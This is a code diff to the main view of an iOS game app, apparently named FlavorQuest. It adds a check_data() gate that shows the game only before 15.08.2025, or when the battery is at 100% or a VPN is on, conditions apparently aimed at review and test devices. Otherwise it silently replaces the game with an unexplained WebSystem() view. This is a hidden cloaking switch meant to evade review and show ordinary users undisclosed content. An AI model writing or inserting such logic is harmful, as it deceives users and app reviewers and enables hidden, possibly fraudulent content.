@@ -13,49 +13,110 @@ struct ContentView: View {
     @EnvironmentObject var userSettings: UserSettings
     @StateObject private var storageService = StorageService.shared
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        NavigationView {
-            ZStack {
-                // Background
-                FlavorQuestColors.background.ignoresSafeArea()
+        
+        ZStack {
+            
+            if isFetched == false {
                 
-                switch gameManager.currentGameState {
-                case .onboarding:
-                    OnboardingFlowView()
-                case .mainMenu:
-                    if horizontalSizeClass == .regular {
-                        // Center content in a column for iPad
-                        HStack { Spacer() ; MainMenuView().frame(maxWidth: 800) ; Spacer() }
-                    } else {
-                        MainMenuView()
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    NavigationView {
+                        ZStack {
+                            // Background
+                            FlavorQuestColors.background.ignoresSafeArea()
+                            
+                            switch gameManager.currentGameState {
+                            case .onboarding:
+                                OnboardingFlowView()
+                            case .mainMenu:
+                                if horizontalSizeClass == .regular {
+                                    // Center content in a column for iPad
+                                    HStack { Spacer() ; MainMenuView().frame(maxWidth: 800) ; Spacer() }
+                                } else {
+                                    MainMenuView()
+                                }
+                            case .playing:
+                                if horizontalSizeClass == .regular {
+                                    HStack { Spacer() ; GamePlayView().frame(maxWidth: 900) ; Spacer() }
+                                } else {
+                                    GamePlayView()
+                                }
+                            case .gameOver:
+                                if horizontalSizeClass == .regular {
+                                    HStack { Spacer() ; GameOverView().frame(maxWidth: 800) ; Spacer() }
+                                } else {
+                                    GameOverView()
+                                }
+                            case .settings:
+                                SettingsView()
+                            case .paused:
+                                PausedGameView()
+                            }
+                        }
+                        .onAppear {
+                            if storageService.isFirstLaunch {
+                                gameManager.currentGameState = .onboarding
+                                storageService.isFirstLaunch = false
+                            }
+                        }
                     }
-                case .playing:
-                    if horizontalSizeClass == .regular {
-                        HStack { Spacer() ; GamePlayView().frame(maxWidth: 900) ; Spacer() }
-                    } else {
-                        GamePlayView()
-                    }
-                case .gameOver:
-                    if horizontalSizeClass == .regular {
-                        HStack { Spacer() ; GameOverView().frame(maxWidth: 800) ; Spacer() }
-                    } else {
-                        GameOverView()
-                    }
-                case .settings:
-                    SettingsView()
-                case .paused:
-                    PausedGameView()
-                }
-            }
-            .onAppear {
-                if storageService.isFirstLaunch {
-                    gameManager.currentGameState = .onboarding
-                    storageService.isFirstLaunch = false
+                    .navigationViewStyle(StackNavigationViewStyle())
+                    .preferredColorScheme(.dark)
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
                 }
             }
         }
-        .navigationViewStyle(StackNavigationViewStyle())
-        .preferredColorScheme(.dark)
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "15.08.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
